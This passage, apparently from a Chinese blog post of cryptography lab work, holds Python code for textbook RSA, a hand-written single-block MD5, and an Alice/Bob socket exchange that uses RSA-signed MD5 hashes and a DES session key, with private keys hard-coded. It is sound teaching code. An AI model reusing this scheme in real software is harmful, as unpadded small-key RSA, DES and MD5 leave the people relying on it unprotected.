    <span class="hljs-keyword">print</span> (<span class="hljs-string">"p = "</span>+str(p))
    <span class="hljs-keyword">print</span> (<span class="hljs-string">"q = "</span>+str(q))
    n = p*q
    <span class="hljs-keyword">print</span> (<span class="hljs-string">"n = "</span>+str(n))
    <span class="hljs-comment"># 用欧拉定理计算 phi_n</span>
    phi_n = (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>)
    <span class="hljs-comment"># 生成e</span>
    e = genE(phi_n)
    <span class="hljs-keyword">print</span> (<span class="hljs-string">"e = "</span>+str(e))
    <span class="hljs-comment"># m = "Hello world!"</span>
    m = str(input(<span class="hljs-string">'请输入明文: '</span>))
    <span class="hljs-comment"># 加密算法</span>
    Cryphtext = RSAEncode(m, e, n)
    <span class="hljs-keyword">print</span> (<span class="hljs-string">"The Ciphertext is: "</span>+str(Cryphtext))
    <span class="hljs-comment"># 解密算法</span>
    d = caculateD(e, phi_n)
    Plaintext = RSADecode(Cryphtext, d, n)
    <span class="hljs-keyword">print</span> (<span class="hljs-string">"The Plaintext is: "</span>+Plaintext)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()</code></pre></div>





<h1 id="五、MD5"><a href="#五、MD5" class="headerlink" title="五、MD5"></a>五、MD5</h1><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/12/18 21:50</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : MD5.py</span>

<span class="hljs-keyword">import</span> math
<span class="hljs-comment"># 定义初始向量abcd,并将其转换成2进制,且补0到32位</span>
<span class="hljs-comment"># 标准的幻数（物理顺序）是（A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是:</span>
<span class="hljs-comment"># （A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L）</span>
ABCD_list = [<span class="hljs-string">'67452301'</span>,<span class="hljs-string">'efcdab89'</span>,<span class="hljs-string">'98badcfe'</span>,<span class="hljs-string">'10325476'</span>]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(ABCD_list)):
    tmp = bin(int(ABCD_list[i], <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:]
    <span class="hljs-keyword">if</span> len(tmp) &lt; <span class="hljs-number">32</span>:
        tmp = (<span class="hljs-number">32</span> - len(tmp)) * <span class="hljs-string">'0'</span> + tmp
    ABCD_list[i] = tmp
A0,B0,C0,D0 = ABCD_list[<span class="hljs-number">0</span>], ABCD_list[<span class="hljs-number">1</span>], ABCD_list[<span class="hljs-number">2</span>], ABCD_list[<span class="hljs-number">3</span>]

<span class="hljs-comment"># 生成第1-64个式子的第i个32比特常数</span>
Ti = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>):
    result = (int(<span class="hljs-number">4294967296</span> * abs(math.sin(i + <span class="hljs-number">1</span>)))) &amp; <span class="hljs-number">0xffffffff</span>
    result = bin(result)[<span class="hljs-number">2</span>:]
    <span class="hljs-keyword">if</span> len(result) &lt; <span class="hljs-number">32</span>:
        result = (<span class="hljs-number">32</span> - len(result)) * <span class="hljs-string">'0'</span> + result
    Ti.append(result)

<span class="hljs-comment"># 实现x,y的逐比特与</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">and1</span><span class="hljs-params">(x, y)</span>:</span>
    res = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(x)):
        res += str(int(x[i])&amp;int(y[i]))
    <span class="hljs-keyword">return</span> res
<span class="hljs-comment"># 实现x,y的逐比特或</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">or1</span><span class="hljs-params">(x, y)</span>:</span>
    res = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(x)):
        res += str(int(x[i])|int(y[i]))
    <span class="hljs-keyword">return</span> res
<span class="hljs-comment"># 实现x,y的逐比特异或</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span><span class="hljs-params">(x, y)</span>:</span>
    res = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(x)):
        res += str(int(x[i])^int(y[i]))
    <span class="hljs-keyword">return</span> res
<span class="hljs-comment"># 实现x的逐比特逻辑反</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse</span><span class="hljs-params">(x)</span>:</span>
    res = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(x)):
        res += str((int(x[i], <span class="hljs-number">2</span>) + <span class="hljs-number">1</span>) % <span class="hljs-number">2</span>)
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 实现x的循环左移</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shift</span><span class="hljs-params">(x, i)</span>:</span>
    res = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(x) - i):
        res = res + x[t + i:t + i + <span class="hljs-number">1</span>]   <span class="hljs-comment"># 先保存 x[i:]  再保存x[:i]</span>
    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, i):
        res = res + x[y:y + <span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 实现整数模2的三十二次方加法</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(x, y)</span>:</span>
    a = int(x,<span class="hljs-number">2</span>)  <span class="hljs-comment">#先将二进制转换成十进制</span>
    b = int(y,<span class="hljs-number">2</span>)
    res = (a + b)%(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)
    res = str(bin(res)[<span class="hljs-number">2</span>:])
    <span class="hljs-keyword">if</span> len(res) != <span class="hljs-number">32</span>:    <span class="hljs-comment"># 补充到32位</span>
        res = (<span class="hljs-number">32</span>-len(res))*<span class="hljs-string">'0'</span>+res
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 定义f,g,h,i函数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ffunc</span><span class="hljs-params">(x, y, z)</span>:</span>  <span class="hljs-comment"># ((x&amp;y)|((~x)&amp;z))</span>
    t = and1(x, y)
    t1 = reverse(x)
    t2 = and1(t1, z)
    <span class="hljs-keyword">return</span> or1(t, t2)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gfunc</span><span class="hljs-params">(x, y, z)</span>:</span>  <span class="hljs-comment"># ((x&amp;z)|(y&amp;(~z)))</span>
    t = and1(x, z)
    t1 = reverse(z)
    t2 = and1(y, t1)
    <span class="hljs-keyword">return</span> or1(t, t2)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hfunc</span><span class="hljs-params">(x, y, z)</span>:</span> <span class="hljs-comment"># (x^y^z)</span>
    t1 = xor(x, y)
    t2 = xor(t1, z)
    <span class="hljs-keyword">return</span> t2

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ifunc</span><span class="hljs-params">(x, y, z)</span>:</span> <span class="hljs-comment"># (y^(x|(~z)))</span>
    t = reverse(z)
    t1 = or1(x, t)
    <span class="hljs-keyword">return</span> xor(y, t1)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(text)</span>:</span>
    text1 = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> text:
        t = str(ord(i))
        t = str(bin(int(t, <span class="hljs-number">10</span>))[<span class="hljs-number">2</span>:])
        <span class="hljs-keyword">if</span> len(t) &lt; <span class="hljs-number">8</span>:                 <span class="hljs-comment"># 将每个字符转换成8位二进制数</span>
            <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span> - len(t)):
                t = <span class="hljs-string">'0'</span> + t
        text1 = text1 + t
    length = len(text1)
    length1 = <span class="hljs-number">512</span> - len(text1) - <span class="hljs-number">65</span>    <span class="hljs-comment"># length1是要填充0的位数</span>
    text1 = text1 + <span class="hljs-string">'1'</span>                <span class="hljs-comment"># 第一位添加 0</span>
    text1 = text1 + <span class="hljs-string">'0'</span>*length1        <span class="hljs-comment"># 将其补充到 N*512+448  N可以为0</span>
    text2 = bin(length)[<span class="hljs-number">2</span>:]            <span class="hljs-comment"># 将字符长度转换成二进制数</span>
    <span class="hljs-keyword">if</span> len(text2) &lt; <span class="hljs-number">8</span>:                 <span class="hljs-comment">#  填充后面64位,先填充字符串的长度,再补0</span>
        text2 = <span class="hljs-string">'0'</span>*(<span class="hljs-number">8</span> - len(text2)) + text2

    length2 = <span class="hljs-number">64</span> - len(text2)
    text2 = text2 + <span class="hljs-string">'0'</span>*length2        <span class="hljs-comment"># 填充后面64位,先填充字符串的长度,再补0</span>
    <span class="hljs-keyword">return</span> text1 + text2

<span class="hljs-comment"># 将最后得到的ABCD逆序输出  最后一步使用</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse_order</span><span class="hljs-params">(a)</span>:</span>
    res = a[<span class="hljs-number">24</span>:<span class="hljs-number">32</span>] + a[<span class="hljs-number">16</span>:<span class="hljs-number">24</span>] + a[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>] + a[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 输入要加密的明文</span>
password = input(<span class="hljs-string">"请输入要加密的信息:"</span>)
<span class="hljs-comment"># 填充算法</span>
x = fill(password)


j = <span class="hljs-number">0</span>
M = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(x),<span class="hljs-number">32</span>):   <span class="hljs-comment"># 将512位分成十六组</span>
    M.append(x[i:i+<span class="hljs-number">32</span>])
    M[j] = M[j][<span class="hljs-number">24</span>:<span class="hljs-number">32</span>] + M[j][<span class="hljs-number">16</span>:<span class="hljs-number">24</span>] + M[j][<span class="hljs-number">8</span>:<span class="hljs-number">16</span>] + M[j][<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]
    j+=<span class="hljs-number">1</span>

<span class="hljs-comment"># md5算法的第一步</span>
A,B,C,D= A0,B0,C0,D0  <span class="hljs-comment">#为第五步 相加原始的A,B,C,D做备份</span>

<span class="hljs-comment"># md5算法的第二步</span>
AA,BB,CC,DD = A,B,C,D

<span class="hljs-comment"># md5算法的第三步</span>
<span class="hljs-comment"># 第一轮     每轮A,B,C,D都处理四次，四轮就是十六次，一共六十四次</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>):                  <span class="hljs-comment"># f函数</span>
    A = add(B, shift(add(A, add(add(ffunc(B, C, D), M[<span class="hljs-number">4</span>*i]), Ti[<span class="hljs-number">4</span> * i])), <span class="hljs-number">7</span>))
    D = add(A, shift(add(D, add(add(ffunc(A, B, C), M[<span class="hljs-number">4</span>*i+<span class="hljs-number">1</span>]), Ti[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>])), <span class="hljs-number">12</span>))
    C = add(D, shift(add(C, add(add(ffunc(D, A, B), M[<span class="hljs-number">4</span>*i+<span class="hljs-number">2</span>]), Ti[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>])), <span class="hljs-number">17</span>))
    B = add(C, shift(add(B, add(add(ffunc(C, D, A), M[<span class="hljs-number">4</span>*i+<span class="hljs-number">3</span>]), Ti[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>])), <span class="hljs-number">22</span>))

<span class="hljs-comment"># 第二轮</span>
k = <span class="hljs-number">1</span>
j = <span class="hljs-number">16</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>):
    A = add(B, shift(add(A, add(add(gfunc(B, C, D), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span>])), <span class="hljs-number">5</span>))
    D = add(A, shift(add(D, add(add(gfunc(A, B, C), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i+<span class="hljs-number">1</span>))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>])), <span class="hljs-number">9</span>))
    C = add(D, shift(add(C, add(add(gfunc(D, A, B), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i+<span class="hljs-number">2</span>))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>])), <span class="hljs-number">14</span>))
    B = add(C, shift(add(B, add(add(gfunc(C, D, A), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i+<span class="hljs-number">3</span>))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>])), <span class="hljs-number">20</span>))

<span class="hljs-comment"># 第三轮</span>
k = <span class="hljs-number">5</span>
j = <span class="hljs-number">32</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>):
    A = add(B, shift(add(A, add(add(hfunc(B, C, D), M[(k+i*<span class="hljs-number">4</span>*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span>])), <span class="hljs-number">4</span>))
    D = add(A, shift(add(D, add(add(hfunc(A, B, C), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>)*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>])), <span class="hljs-number">11</span>))
    C = add(D, shift(add(C, add(add(hfunc(D, A, B), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>)*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>])), <span class="hljs-number">16</span>))
    B = add(C, shift(add(B, add(add(hfunc(C, D, A), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>)*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>])), <span class="hljs-number">23</span>))

<span class="hljs-comment"># 第四轮</span>
k = <span class="hljs-number">0</span>
j = <span class="hljs-number">48</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>):
    A = add(B, shift(add(A, add(add(ifunc(B, C, D), M[(k+(i*<span class="hljs-number">4</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span>])), <span class="hljs-number">6</span>))
    D = add(A, shift(add(D, add(add(ifunc(A, B, C), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>])), <span class="hljs-number">10</span>))
    C = add(D, shift(add(C, add(add(ifunc(D, A, B), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>])), <span class="hljs-number">15</span>))
    B = add(C, shift(add(B, add(add(ifunc(C, D, A), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>])), <span class="hljs-number">21</span>))
<span class="hljs-comment"># 第五步  将计算出的A,B,C,D与初始的相加，并赋值</span>
A,B,C,D = add(A, AA),add(B, BB),add(C, CC),add(D, DD)
<span class="hljs-comment"># 输出得到的密文</span>

ciphertext = reverse_order(A) + reverse_order(B) + reverse_order(C) + reverse_order(D)
cipher = ciphertext
ciphertext = str(hex(int(ciphertext, <span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:])   <span class="hljs-comment"># 将二进制数转换为十六进制数</span>
ciphertext = <span class="hljs-string">'0'</span>*(<span class="hljs-number">32</span>-len(ciphertext))+ciphertext <span class="hljs-comment"># 为了避免第一个数字为零时无法显示出来</span>
print(<span class="hljs-string">"hash值(小写):"</span>,ciphertext)
print(<span class="hljs-string">"hash值(大写):"</span>,ciphertext.upper())</code></pre></div>





<h1 id="六、综合实验"><a href="#六、综合实验" class="headerlink" title="六、综合实验"></a>六、综合实验</h1><h3 id="6-1-实验内容"><a href="#6-1-实验内容" class="headerlink" title="6.1 实验内容"></a>6.1 实验内容</h3><p>现在，Alice想通过公共信道给Bob传输一份秘密文件（文件非常大）。又知道，很多人和机构想得到这份文件。需要设计一个通信模型，来保证文件的机密性和完整性。</p>
<p>  现在很多人想要得到这份文件，那么，可能会有很多人在假冒Bob的身份，来请求得到这个文件，需要对Bob身份进行验证；也有可能是很多人得不到文件，就假冒Alice的身份，想要给Bob发送文件，如果有人发送恶意文件给Bob，Bob发现不是想要的文件，但这个文件给Bob电脑安装了后门，等他接受了正确的文件，就存在泄漏的风险，所以需要对Alice身份进行验证。</p>
<h3 id="6-2-分析实验需求"><a href="#6-2-分析实验需求" class="headerlink" title="6.2 分析实验需求"></a>6.2 分析实验需求</h3><p>现在很多人想要得到这份文件，那么，可能会有很多人在假冒Bob的身份，来请求得到这个文件，需要对Bob身份进行验证；也有可能是很多人得不到文件，就假冒Alice的身份，想要给Bob发送文件，如果有人发送恶意文件给Bob，Bob发现不是想要的文件，但这个文件给Bob电脑安装了后门，等他接受了正确的文件，就存在泄漏的风险，所以需要对Alice身份进行验证。</p>
<p><strong>根据分析，所得结果如下:</strong></p>
<ol>
<li><p>传输的是秘密文件，所以可能存在人冒充bob接收文件，所以Alice在与传输文件之前需要对bob的身份进行认证，而且bob防止被欺骗也需要对Alice的身份进行认证，这里可以采用第二类签名算法。</p>
</li>
<li><p>在确认彼此身份后需要将文件通过公共信道传输，但是可能存在攻击人劫持，所以需要对文件内容加密，而文件内容很大，考虑到加密速度问题，所以采用对称加密算法。</p>
</li>
<li><p>采用对称加密算法需要密钥，而这里使用随机生成的密钥。并且这个密钥也需要传给bob用于解密，但是公共信道不安全，所以也需要对该密钥进行加密。考虑到密钥长度不是很大，所以可以采用公钥加密算法，而且公钥加密算法可以解决传输此次加密使用的密钥，提高安全性和效率。</p>
</li>
<li><p>Bob收到密文和加密后的密钥，使用自己的私钥解密出对称加密算法使用的密钥，然后使用密钥解密密文后向Alice发送确认消息，确保bob收到消息。</p>
</li>
<li><p>确认消息也要使用到第一步使用的签名算法。</p>
</li>
</ol>
<h3 id="6-3-程序流程图"><a href="#6-3-程序流程图" class="headerlink" title="6.3 程序流程图"></a>6.3 程序流程图</h3><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210202142616269.png" srcset="/img/loading.gif" alt="image-20210202142616269"></p>
<h3 id="6-4-完整代码"><a href="#6-4-完整代码" class="headerlink" title="6.4 完整代码"></a>6.4 完整代码</h3><p>Alice</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/1/3 23:17</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : Alice.py</span>

<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> DES <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> file_decode <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> socket

n_bob = <span class="hljs-number">81836285346168841919828227774710209132464519960137459236348092425786962849543</span>
n = <span class="hljs-number">44531776921047477359676235110843825307036514195195627878765712056028758572817</span>
d = <span class="hljs-number">34159352569920789505556306994405309761109146525598570740717995833480670158209</span>
e = <span class="hljs-number">65537</span>

name = <span class="hljs-string">"This is alice."</span>

client = socket.socket()
client.connect((<span class="hljs-string">'127.0.0.1'</span>,<span class="hljs-number">8888</span>))  <span class="hljs-comment"># 本机地址和端口</span>

data = client.recv(<span class="hljs-number">1024</span>)
print(str(data, <span class="hljs-string">"utf-8"</span>),end=<span class="hljs-string">""</span>)
client.send(<span class="hljs-string">b'1'</span>)
print(<span class="hljs-string">"等待bob验证自身身份..."</span>)

<span class="hljs-comment"># alice送出自己的身份信息和签名值</span>
client.send(bytes(name,<span class="hljs-string">'utf-8'</span>))             <span class="hljs-comment"># alice发送身份明文信息</span>
client.recv(<span class="hljs-number">1024</span>).decode()
hash_name = md5(name)
crpto_name = str(RSAEncode(hash_name, d, n)) <span class="hljs-comment"># 发送对hash值加密后的值</span>
crpto_name = bytes(crpto_name,<span class="hljs-string">'utf-8'</span>)
client.send(crpto_name)

print(client.recv(<span class="hljs-number">1024</span>).decode())             <span class="hljs-comment"># 接收身份认证的结果</span>
<span class="hljs-comment">#接收bob身份hash并验证</span>
print(<span class="hljs-string">"验证bob身份..."</span>,end=<span class="hljs-string">""</span>)
a=input()

bob_name = client.recv(<span class="hljs-number">512</span>).decode()          <span class="hljs-comment"># bob发送过来的身份明文信息</span>
client.send(<span class="hljs-string">b'1'</span>)

hash_name = client.recv(<span class="hljs-number">512</span>).decode()         <span class="hljs-comment"># bob使用自己的私钥加密身份明文信息hash值后的值</span>
plain_text = RSADecode(int(hash_name),e,n_bob) <span class="hljs-comment"># 使用bob的公钥解密上一步的值</span>

client.send(<span class="hljs-string">b'1'</span>)
<span class="hljs-keyword">if</span> plain_text == md5(bob_name):          <span class="hljs-comment"># 验证是不是bob</span>
    print(bob_name)
    print(<span class="hljs-string">"验证通过!"</span>)
<span class="hljs-keyword">else</span>:
    exit(<span class="hljs-string">"验证错误!"</span>)


<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
    a = input()
    bin_key = gen_key()         <span class="hljs-comment"># 随机生成64位的 DES加密明文使用的密钥</span>
    int_key = int(bin_key,<span class="hljs-number">2</span>)    <span class="hljs-comment"># 将其转换为十进制数，便于后面使用RSA算法加密</span>
    print(<span class="hljs-string">"随机产生对称密钥:"</span>,int_key)  <span class="hljs-comment"># 每次传输随机产生一个密钥更加安全</span>

    plain = read_file()    <span class="hljs-comment"># 读取文件内容</span>
    bin_cipher = DES_encode(plain, bin_key) <span class="hljs-comment"># 使用DES算法加密内容</span>

    a = input()
    int_key = fast_mod(int_key,e,n_bob)   <span class="hljs-comment"># 加密DES的密钥 e是bob的公钥</span>
    print(<span class="hljs-string">"加密对称密钥"</span>)

    print(<span class="hljs-string">"传输密钥..."</span>)               <span class="hljs-comment"># 传输加密后DES密钥</span>
    client.sendall(bytes(str(int_key),<span class="hljs-string">"utf-8"</span>))
    client.recv(<span class="hljs-number">512</span>)

    length = str(len(bin_cipher))     <span class="hljs-comment"># 传输发送内容的长度</span>
    length = bytes(length,<span class="hljs-string">"utf-8"</span>)    <span class="hljs-comment"># 方便其接收</span>
    client.send(length)

    print(<span class="hljs-string">"传输密文..."</span>)
    client.sendall(bytes(str(bin_cipher),<span class="hljs-string">"utf-8"</span>)) <span class="hljs-comment">#发送密文</span>
    message = client.recv(<span class="hljs-number">512</span>).decode()
    client.send(<span class="hljs-string">b'1'</span>)
    crypt_message = client.recv(<span class="hljs-number">512</span>).decode()
    hash_message = RSADecode(int(crypt_message),e,n_bob)
    <span class="hljs-keyword">if</span> hash_message == md5(message):
        print(message)
    print(<span class="hljs-string">"文件传输结束！"</span>)
    <span class="hljs-keyword">break</span>
client.close()</code></pre></div>



<p>Bob</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/1/3 23:17</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : bob.py</span>

<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> libnum
<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> DES <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *

name = <span class="hljs-string">"This is bob."</span>


n = <span class="hljs-number">81836285346168841919828227774710209132464519960137459236348092425786962849543</span>
n_alice = <span class="hljs-number">44531776921047477359676235110843825307036514195195627878765712056028758572817</span>
d = <span class="hljs-number">39540198292360595989919600111176873707392294831248672388670326288876701993673</span>
e = <span class="hljs-number">65537</span>

<span class="hljs-comment"># e_alice = 2081</span>

server = socket.socket() <span class="hljs-comment">#创建对象</span>
server.bind((<span class="hljs-string">"localhost"</span>,<span class="hljs-number">8888</span>))<span class="hljs-comment">#绑定 ip和端口</span>
server.listen()  <span class="hljs-comment">#监听</span>
<span class="hljs-comment">#等待连接</span>
print(<span class="hljs-string">'Waiting connection...'</span>)
<span class="hljs-comment">#接受请求，返回套接字对象和IP+端口号</span>
con,addr = server.accept()
con.send(bytes(<span class="hljs-string">"Welcome connect!\n开始加密传输:\n"</span>,<span class="hljs-string">"utf-8"</span>))
con.recv(<span class="hljs-number">1024</span>)

<span class="hljs-comment"># 验证alice身份</span>
print(<span class="hljs-string">"验证alice身份..."</span>)
a = input()
alice_name = con.recv(<span class="hljs-number">512</span>).decode()  <span class="hljs-comment"># alice 的明文信息</span>
con.send(<span class="hljs-string">b'1'</span>)
hash_name = con.recv(<span class="hljs-number">512</span>).decode()   <span class="hljs-comment"># alice 用私钥加密明文的hash值</span>
plain_text = RSADecode(int(hash_name),e,n_alice) <span class="hljs-comment"># 用alice 的公钥解密出hash值</span>
<span class="hljs-keyword">if</span> plain_text == md5(alice_name):   <span class="hljs-comment"># 判断上一步的值与md5函数加密是否相同</span>
    print(alice_name)               <span class="hljs-comment"># 如果二者相同则可以保证对方是alice,这里的安全性是由公钥算法和hash函数保证</span>
    print(<span class="hljs-string">"验证通过！"</span>)               <span class="hljs-comment"># 因为只有alice有自己的私钥，hash函数的存在防止伪造明文攻击</span>
    con.send(bytes(<span class="hljs-string">"您通过了验证!"</span>,<span class="hljs-string">"utf-8"</span>))
<span class="hljs-keyword">else</span>:
    exit(<span class="hljs-string">"这不是alice,验证错误！"</span>)
<span class="hljs-comment">#送出自己的身份信息和签名值</span>
print(<span class="hljs-string">"等待alice验证自身身份..."</span>)

con.send(bytes(name,<span class="hljs-string">'utf-8'</span>))    <span class="hljs-comment"># 向alice发送身份信息的明文</span>
con.recv(<span class="hljs-number">1024</span>).decode()

hash_name = md5(name)            <span class="hljs-comment"># 明文信息的hash值</span>
crpto_name = str(RSAEncode(hash_name, d, n))  <span class="hljs-comment"># 使用自己的私钥加密上一步的hash值</span>
crpto_name = bytes(crpto_name,<span class="hljs-string">'utf-8'</span>)        <span class="hljs-comment"># 发送给alice</span>
con.send(crpto_name)
con.recv(<span class="hljs-number">1024</span>)

<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
    data = con.recv(<span class="hljs-number">1024</span>)    <span class="hljs-comment"># 接收alice发送的使用公钥算法加密后的DES的密钥</span>
    data = data.decode()
    int_key = int(data)
    print(<span class="hljs-string">"被加密后的密钥:"</span>,int_key)
    int_key = fast_mod(int_key, d, n)  <span class="hljs-comment"># 使用私钥d解密出DES密钥</span>
    print(<span class="hljs-string">"解密后的密钥"</span>, int_key)

    print(<span class="hljs-string">"----"</span>*<span class="hljs-number">10</span>)         <span class="hljs-comment"># 接收密文的长度（为了方便存储）</span>
    con.send(<span class="hljs-string">b'1'</span>)
    length = con.recv(<span class="hljs-number">1024</span>)
    length = int(length.decode())
    buff = []
    size = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> size &lt; length:    <span class="hljs-comment"># 开始接受密文</span>
        dat = con.recv(<span class="hljs-number">1024</span>)
        size += len(dat.decode())
        buff.append(dat)
    data = <span class="hljs-string">b''</span>.join(buff)
    bin_cipher = data.decode()

    cipher = bin_to_str(bin_cipher)
    bin_key = bin(int_key)[<span class="hljs-number">2</span>:]      <span class="hljs-comment"># 将密钥转换成二进制数</span>
    print(<span class="hljs-string">"解密传输内容:"</span>)
    print(libnum.b2s(DES_decode(cipher, bin_key))) <span class="hljs-comment">#打印出解密后的明文</span>
    message = <span class="hljs-string">"Bob received the file successfully!"</span>
    con.send(bytes(message,<span class="hljs-string">'utf-8'</span>))
    con.recv(<span class="hljs-number">1024</span>).decode()
    hash_message = md5(message)
    crypt_message = str(RSAEncode(hash_message,d,n))
    con.send(bytes(crypt_message,<span class="hljs-string">'utf-8'</span>))
    <span class="hljs-keyword">break</span>

server.close()</code></pre></div>



<p>file_decode</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/1/3 23:17</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : file_decode.py</span>


<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> DES <span class="hljs-keyword">import</span> *
